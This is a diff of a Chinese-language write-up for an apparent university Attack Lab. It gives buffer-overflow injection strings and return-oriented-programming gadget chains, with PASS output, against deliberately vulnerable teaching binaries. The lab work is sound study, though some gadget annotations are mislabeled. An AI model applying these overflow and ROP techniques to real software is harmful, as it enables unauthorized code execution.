@@ -18,14 +18,18 @@ Num     Type           Disp Enb Address            What
 3       breakpoint     keep y   0x0000000000401351 in main at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
 ```
 
-## 实验过程
-### phase_1
+### 注入式攻击
 首先，进行注入式攻击的前提是了解过程调用时堆栈的变化过程。
 
 将控制从函数P转移到函数Q时，需要简单地把程序计数器(PC)设置为Q的代码的起始位置。不过，当稍后从Q返回的时候，处理器必须记录好它需要继续P的执行的代码位置。在x86-64机器中，这个信息是用指令```call Q```调用Q来记录的。call指令将当前的指令地址A压入栈中，并将PC设置为Q的起始位置。压入堆栈中的地址A被称为返回地址，是紧跟在call指令后面那条指令的地址。对应的指令ret会从栈中弹出地址A，并把PC设置为A。
 
 所以注入式攻击的实质，就是输入的字符串长度超过了缓存区的长度，并把rsp栈中的返回地址给覆盖掉，这样就可以操控程序被攻击代码所接管。
 
+### 面向返回的攻击
+
+## 实验过程
+### phase_1
+#### phase_1实验过程
 首先，我们进入test函数，并运行至调用```getbuf```函数前。在调用之前，首先我们检查一下rsp处栈的内容:
 ```
 Dump of assembler code for function test:
@@ -88,7 +92,7 @@ echo -ne '' > exploit.txt; for i in {1..10}; do echo -ne '63 63 63 63 ' >> explo
 ./ctarget -q -i exploit_raw.txt
 ```
 
-实验结果
+#### phase_1实验结果
 ```
 ./ctarget -q -i exploit_raw.txt
 Cookie: 0x59b997fa
@@ -102,7 +106,7 @@ PASS: Would have posted the following:
 ```
 
 ### phase_2
-#### phase_2的建议项
+#### phase_2的实验过程
 Some Advice:
 • You will want to position a byte representation of the address of your injected code in such a way that
 ret instruction at the end of the code for getbuf will transfer control to it.
@@ -136,6 +140,7 @@ ret
 48 c7 c7 fa 97 b9 59 c3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
 ```
 
+#### phase_2实验结果
 实验结果，通过了
 ```
 Cookie: 0x59b997fa
@@ -149,6 +154,7 @@ PASS: Would have posted the following:
 ```
 
 ### phase_3
+#### phase_3的实验过程
 实验三的解决方法类似于实验二，我们将输入的字符串放置在控制代码之前，注入攻击的代码形式为
 ```
    <cookie(59b997fa)>: 35 39 62 39 39 37 66 61
@@ -161,7 +167,7 @@ PASS: Would have posted the following:
 ```
 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 bf 78 dc 61 55 c3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00
 ```
-
+#### phase_3实验结果
 最后成功通过这个测试
 ```
 Cookie: 0x59b997fa
@@ -175,6 +181,7 @@ PASS: Would have posted the following:
 ```
 
 ### phase_4
+#### phase_4的实验过程
 面向返回的攻击方式，主要有两大限制，这里我们选取gadget(小器具)。
 ```
 00000000004019ca <getval_280>:
@@ -198,6 +205,7 @@ fa 97 b9 59 00 00 00 00
 a2 19 40 00 00 00 00 00
 ec 17 40 00 00 00 00 00(touch2)
 
+#### phase_4的实验结果
 实验结果
 ```
 ./rtarget -q -i exploit_raw.txt 
@@ -219,21 +227,103 @@ fa 97 b9 59 00 00 00 00
 a2 19 40 00 00 00 00 00
 ec 17 40 00 00 00 00 00(touch2)
 
-gadget3
+### phase_5
+#### phase_5的实验过程
+在这个实验中，我们使用到的gadgets
 ```
+// gadget1 pop
+// 0x90 : nop
+// popq rax : 58
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+// gadget2 
+// movq rax, rdi:48 89 c7
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq
+
+// gadget3
+// movq rsp, rax: 48 89 e0
 0000000000401a03 <addval_190>:
   401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
   401a09:	c3                   	retq   
-// movq rsp, rax: 48 89 e0
+
+// gadget4
+// movl edx, ecx : 89 d1
+// cmpb : 38 c9
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+  401a38:	c3                   	retq   
+ 
+// gadget5
+// movl ecx, esi:89 ce
+// nop : 90
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq  
+
+// gadget6
+// movl eax, edx:89 ce
+// nop : 90
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
 ```
-0x401a06(gadget3 + 3)
+
+然后，我们还需要稍微修改下入口地址
+```
+gadget1 004019ca + 2 = 004019cc
+gadget2 004019a0 + 2 = 004019a2
+gadget3 00401a03 + 3 = 00401a06
+gadget4 00401a33 + 1 = 00401a34
+gadget5 00401a11 + 2 = 00401a13
+gadget6 004019db + 2 = 004019dd
+```
+
+<!-- gadget1 -->
+然后我们对这些gadget进行组装，组装方式为以下的形式；
+```
+gadget3 00401a06
+<rdi = rsp>
+gadget2 004019a2 movq rsp, rax
+gadget1 004019cc movq rax, rdi
+offset  00000048 popq rax
+gadget6 004019dd movl eax, edx
+gadget4 00401a34 movl edx, ecx
+gadget5 00401a13 movl ecx, esi
+add_xy  004019d6
+gadget2 004019a2
+touch3
 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00(cookie的string表示)
-0x4019cc(gadget1 + 3)
-0x4019cc(gadget1 + 3)
-0x4019a2(gadget2 + 2)
-0x4017ec(touch3)
-35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
+```
+改写完机器代码如下:
+```
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
 cc 19 40 00 00 00 00 00
-cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
 a2 19 40 00 00 00 00 00
 fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+```
+
+#### phase_5的实验结果
+Continuing.
+```
+./rtarget -q -i exploit_raw.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
+```
